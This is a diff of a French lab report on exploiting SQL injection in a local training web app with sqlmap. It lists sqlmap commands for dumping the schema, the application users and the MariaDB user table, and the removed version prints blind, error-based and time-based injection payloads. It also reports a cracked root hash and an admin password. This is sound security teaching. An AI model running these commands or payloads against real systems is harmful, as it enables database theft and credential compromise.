@@ -1,150 +1,164 @@
+# SQL Injection Training App - Rapport
 
-# Projet : Exploitation SQL Injection avec SQLMap
+## Objectif
 
-## Description
+Ce projet vise à exploiter des vulnérabilités d'injection SQL pour extraire des informations sensibles d'une application web vulnérable. Les objectifs spécifiques sont :
 
-Ce projet explore l'exploitation de vulnérabilités SQL Injection sur une application web locale. L’outil **SQLMap** a permis d’identifier plusieurs types de failles SQL Injection et d’extraire des informations sensibles de la base de données, notamment les utilisateurs et les privilèges.
-
-### Identification de la base de données et vulnérabilités SQL Injection
-
-Lors des tests initiaux, l’insertion d’une apostrophe (`'`) dans le champ `uid` du formulaire `register.php` a produit une erreur SQL révélant l'utilisation de **MariaDB** comme système de gestion de base de données. En suivant cette indication, une commande SQLMap a été exécutée pour tester la présence de vulnérabilités. Cette commande a révélé plusieurs failles exploitables :
-
-```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" --level=2 --risk=3 --batch
-```
-
-Les vulnérabilités détectées sont les suivantes :
-
-1. **Injection SQL de type boolean-based blind** :
-   - **Description** : Cette technique permet de manipuler des requêtes SQL basées sur des conditions booléennes.
-   - **Exemple de Payload** : `uid=test' RLIKE (SELECT (CASE WHEN (7373=7373) THEN 0x74657374 ELSE 0x28 END)) AND 'ZdRI'='ZdRI`
-
-2. **Injection SQL de type error-based** :
-   - **Description** : Cette technique repose sur les erreurs SQL renvoyées par le serveur pour obtenir des informations.
-   - **Exemple de Payload** : `uid=test' AND EXTRACTVALUE(5067,CONCAT(0x5c,0x71716b7671,(SELECT (ELT(5067=5067,1))),0x716b6a6271)) AND 'tpCd'='tpCd`
-
-3. **Injection SQL de type time-based blind** :
-   - **Description** : Cette technique permet d’utiliser des délais de réponse pour vérifier la validité des requêtes.
-   - **Exemple de Payload** : `uid=test' AND (SELECT 2799 FROM (SELECT(SLEEP(5)))gnXJ) AND 'XAFL'='XAFL`
-
-Ces vulnérabilités ont confirmé la possibilité d'exploiter les injections SQL et d'extraire des données sans authentification.
+1. **Extraire le schéma de la base de données** et le sauvegarder dans un fichier `.csv`.
+2. **Lister les utilisateurs de l'application** et les sauvegarder dans un fichier `.csv`.
+3. **Lister les utilisateurs de MariaDB** et les sauvegarder dans un fichier `.csv`.
+4. **Obtenir et documenter le mot de passe de l'utilisateur root de MariaDB** par force brute.
+5. **Challenge 2 : Obtenir et documenter le mot de passe de l'administrateur de l'application**.
 
 ---
 
-## Objectifs de l'examen
+## Pré-requis
 
-1. Effectuer un dump du schéma de la base de données.
-2. Récupérer la liste des utilisateurs de l'application.
-3. Récupérer la liste des utilisateurs de MariaDB.
-4. Obtenir et déchiffrer le mot de passe root de MariaDB via une attaque par force brute.
-5. Extraire le mot de passe administrateur de l'application.
+- **sqlmap** : Outil pour automatiser la détection et l'exploitation des vulnérabilités d'injection SQL.
+- **MariaDB** : Système de gestion de base de données utilisé par l'application cible.
+- **Accès à l'application web vulnérable**.
 
 ---
 
-## Fichiers Exportés
+## Étapes Réalisées
 
-Voici les fichiers générés au format `.csv` et `.txt` contenant les informations récupérées :
+### 1. Identification des Vulnérabilités d'Injection SQL
 
-- **Schéma de la base de données :**
-  - [Schéma de la base `sqlitraining`](output/sqlitraining-schema.csv)
-  - [Tables dans `information_schema`](output/information_schema-tables.csv)
-  - [Tables dans `sys`](output/sys-tables.csv)
-  - [Tables dans `mysql`](output/mysql-tables.csv)
+Lors des tests initiaux, l'insertion d'une apostrophe (`'`) dans le champ `uid` du formulaire `register.php` a généré une erreur SQL, révélant l'utilisation de MariaDB. Nous avons utilisé `sqlmap` pour automatiser le processus d'exploitation.
 
-- **Utilisateurs de l'application :**
-  - [Liste des utilisateurs de l'application](output/sqlitraining-users.csv)
-
-- **Utilisateurs de MariaDB :**
-  - [Liste des utilisateurs de MariaDB](output/mysql-users.csv)
-
-- **Mot de passe root de MariaDB :**
-  - [Mot de passe root de MariaDB (force brute)](output/root-password.txt)
-
-- **Mot de passe administrateur de l'application :**
-  - [Mot de passe administrateur de l'application](output/admin-password.txt)
-
----
-
-## Commandes SQLMap Utilisées
-
-Voici un aperçu des commandes SQLMap exécutées pour chaque objectif :
-
-### 1. Détection de la vulnérabilité SQL Injection
+### 2. Extraction du Schéma de la Base de Données
 
 **Commande utilisée :**
+
 ```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" --level=2 --risk=3 --batch
+sqlmap -u "http://localhost:8888/register.php" \
+--data="uid=test&password=test&name=test&descr=test" \
+--dbs --batch
 ```
 
-### 2. Extraction des Bases de Données Disponibles
+**Résultat :**
 
-**Commande :**
+Les bases de données suivantes ont été identifiées :
+
+- `information_schema`
+- `mysql`
+- `performance_schema`
+- `sqlitraining`
+- `sys`
+
+Nous avons extrait le schéma de la base de données `sqlitraining` :
+
 ```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" --dbs --batch
+sqlmap -u "http://localhost:8888/register.php" \
+--data="uid=test&password=test&name=test&descr=test" \
+-D sqlitraining --tables --batch
 ```
 
-### 3. Récupération du Schéma de la Base de Données `sqlitraining`
+**Tables trouvées :**
 
-**Commande :**
+- `products`
+- `users`
+
+**Dump du schéma dans un fichier `.csv` :**
+
 ```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining --tables --batch
+sqlmap -u "http://localhost:8888/register.php" \
+--data="uid=test&password=test&name=test&descr=test" \
+-D sqlitraining --dump --dump-format=CSV --batch
 ```
 
-### 4. Récupération des Tables de `information_schema`
+### 3. Liste des Utilisateurs de l'Application
+
+En ciblant la table `users` de la base `sqlitraining`, nous avons extrait les utilisateurs de l'application.
 
 **Commande :**
+
 ```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D information_schema --tables --batch
+sqlmap -u "http://localhost:8888/register.php" \
+--data="uid=test&password=test&name=test&descr=test" \
+-D sqlitraining -T users --dump --dump-format=CSV --batch
 ```
 
-### 5. Extraction des Données de la Table `users` dans `sqlitraining`
+**Résultat :**
+
+Les informations des utilisateurs ont été sauvegardées dans un fichier `.csv`.
+
+### 4. Liste des Utilisateurs de MariaDB
+
+Nous avons ciblé la base de données `mysql`, qui contient les informations des utilisateurs de MariaDB.
 
 **Commande :**
+
 ```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T users --dump --dump-format=CSV --batch
+sqlmap -u "http://localhost:8888/register.php" \
+--data="uid=test&password=test&name=test&descr=test" \
+-D mysql -T user --dump --dump-format=CSV --batch
 ```
 
-### 6. Extraction des Données de la Table `products` dans `sqlitraining`
+**Résultat :**
 
-**Commande :**
-```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T products --dump --dump-format=CSV --batch
+La liste des utilisateurs de MariaDB a été extraite et sauvegardée dans un fichier `.csv`.
+
+### 5. Récupération du Mot de Passe de l'Utilisateur Root de MariaDB
+
+En examinant les données extraites de la table `user` de la base `mysql`, nous avons récupéré le hachage du mot de passe de l'utilisateur `root`.
+
+**Hachage récupéré :**
+
+```
+81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
 ```
 
-### 7. Récupération des Tables dans la Base `mysql`
+Nous avons utilisé un outil de déchiffrement en ligne pour casser le hachage (par exemple, CrackStation).
 
-**Commande :**
-```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D mysql --tables --batch
+**Mot de passe obtenu :**
+
+```
+root
 ```
 
-### 8. Extraction des Données de la Table `user` dans `mysql`
+### 6. Challenge 2 : Récupération du Mot de Passe de l'Administrateur de l'Application
+
+En analysant la table `users` de la base `sqlitraining`, nous avons identifié l'utilisateur administrateur.
 
 **Commande :**
+
 ```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D mysql -T user --dump --batch --dump-format=CSV
+sqlmap -u "http://localhost:8888/register.php" \
+--data="uid=test&password=test&name=test&descr=test" \
+-D sqlitraining -T users --dump --dump-format=CSV --batch
 ```
 
-### 9. Extraction des Données Précises (User, Host, authentication_string) dans la Table `user` pour l’utilisateur `root`
+**Mot de passe de l'administrateur :**
 
-**Commande :**
-```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D mysql -T user -C User,Host,authentication_string --dump --where="User='root'" --batch
 ```
-
-- **Détails** : Le mot de passe obtenu, `81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`, correspond à **root** après décryptage sur **CrackStation**. Ce mot de passe était encodé en MySQL4.1+.
-
-### 10. Extraction du Mot de Passe Administrateur de l'Application
-
-**Commande :**
-```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T users --dump --batch
+admin
 ```
 
 ---
 
-### Notes Légales
+## Fichiers Générés
 
-L'utilisation de **SQLMap** pour des attaques sans autorisation préalable est illégale. Ce projet est réalisé dans un cadre d'apprentissage sécurisé et contrôlé.
+- **Schéma de la base de données** : `database_schema.csv`
+- **Liste des utilisateurs de l'application** : `application_users.csv`
+- **Liste des utilisateurs de MariaDB** : `mariadb_users.csv`
+- **Mot de passe root de MariaDB** : `mariadb_root_password.txt`
+- **Mot de passe administrateur de l'application** : `application_admin_password.txt`
+
+---
+
+## Conclusion
+
+Grâce à l'exploitation des vulnérabilités d'injection SQL présentes dans l'application, nous avons pu extraire des informations sensibles, démontrant l'importance de sécuriser les entrées utilisateur.
+
+---
+
+## Remarques
+
+Pour améliorer la sécurité de l'application, il est recommandé de :
+
+- Utiliser des requêtes préparées (requêtes paramétrées) pour éviter les injections SQL.
+- Valider et assainir toutes les entrées utilisateur.
+- Mettre à jour régulièrement les systèmes de gestion de base de données et les applications web pour bénéficier des derniers correctifs de sécurité.
 
 ---
